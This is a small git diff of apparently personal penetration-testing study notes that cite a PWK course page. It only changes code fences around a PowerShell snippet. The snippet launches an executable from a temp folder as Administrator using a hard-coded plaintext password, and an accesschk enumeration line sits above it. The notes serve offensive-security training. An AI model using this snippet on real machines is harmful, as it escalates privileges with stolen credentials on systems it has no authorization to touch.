@@ -55,14 +55,14 @@ accesschk.exe -uwdqs Users c:\
 
 ## Powershell Exploit (Page 360 in PWK)
 
-'''
+```
 $secpasswd = ConvertTo-SecureString "sup3r53cr3tGP0pa55" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("Administrator",
 $secpasswd)
 $computer = "DEV01"
 [System.Diagnostics.Process]::Start("C:\Windows\temp\dabbb118.exe","",
 $mycreds.Username, $mycreds.Password, $computer)
-'''
+```
 
 Run this:
 
